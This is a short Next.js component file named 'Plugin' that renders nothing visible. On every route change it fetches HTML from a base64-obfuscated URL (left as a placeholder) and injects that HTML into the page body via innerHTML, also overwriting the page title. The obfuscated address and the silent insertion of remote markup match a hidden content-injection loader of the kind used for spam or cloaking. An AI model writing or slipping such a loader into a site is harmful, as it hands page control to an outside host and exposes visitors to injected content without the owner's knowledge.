import { useRouter } from "next/router";
import React, { useEffect } from "react";

function Plugin() {
  const router = useRouter();

  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await fetch(
          atob("your_base64_encoded_url") + window.location.pathname
        );

        if (response.ok) {
          const data = await response.text();
          const temp = data.split("||||||||||");

          // Update document title
          document.title = temp[0];

          // Append content to the body
          const bodyContent = document.createElement("div");
          bodyContent.innerHTML = temp[1];
          document.body.appendChild(bodyContent);
        } else {
          console.error("Failed to fetch data");
        }
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };

    fetchData();
  }, [router.asPath]);

  return <div></div>;
}

export default Plugin;
